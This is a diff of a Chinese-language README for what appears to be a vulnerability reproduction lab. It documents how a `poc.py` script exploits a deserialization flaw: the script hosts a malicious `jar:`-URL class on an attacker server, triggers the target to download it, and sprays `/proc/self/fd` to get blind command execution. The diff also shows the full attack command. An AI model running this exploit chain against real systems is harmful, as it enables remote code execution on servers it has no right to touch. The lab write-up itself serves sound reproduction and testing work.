@@ -27,7 +27,7 @@ docker compose up -d
 配套的 `poc.py` 将整条链自动化：它用纯 Python 生成以 `jar:` URL 为类名的恶意类，通过内置 HTTP 服务托管，并依次发送两个阶段的请求。运行时用你本机的 IP 作为攻击者地址（目标容器必须能访问到它），并指定要执行的命令：
 
 ```
-python3 poc.py pwn -t http://your-ip:8090 -l <攻击者 IP> -c 'id > /tmp/success'
+python3 poc.py pwn -t http://your-ip:8090/ -l <攻击者 IP> -c 'id > /tmp/success'
 ```
 
 工具会先输出攻击者 IP 的十进制形式，构建并托管 probe JAR，发送第一阶段的下载请求（这里返回 `400` 或 `autoType is not support` 都是正常的，下载副作用已经发生），随后遍历 `/proc/self/fd` 区间进行喷洒。该端点即使利用成功也会返回错误，因为它产生的对象并不是期望的 bean，所以命令执行是盲打的，需要带外核验。
